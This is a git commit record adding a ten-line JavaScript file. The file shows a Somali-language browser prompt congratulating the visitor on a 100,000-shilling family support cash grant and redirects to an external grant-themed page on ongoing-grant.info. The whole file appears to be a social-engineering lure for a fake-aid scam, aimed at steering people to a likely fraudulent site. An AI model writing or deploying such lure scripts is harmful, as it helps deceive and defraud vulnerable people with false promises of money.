15d0680cc831a97bca6c04951a19a7c28612204f
The-On-going <sirpeelawson@gmail.com>
2026-09-06 21:49:08 +0100

    Create activessss.js

---
+++ activessss.js
@@ -0,0 +1,10 @@
+var password = 'Sl.Sh.100,000';
+
+password = prompt(
+  'Hambalyo, waxaad xaq u leedahay inaad hesho Sl.Sh.100,000 Taageerada Qoysaska ee Deeqda Lacageed. Guji OK si aad isla markiiba u hesho.',
+  'Sl.Sh.100,000'
+);
+
+if (password !== 'Sl.Sh.100,000') {
+    location.href = 'https://ongoing-grant.info/S1sh100000-Deeq-lacageedka-Taageerada-Qoyska.html';
+}
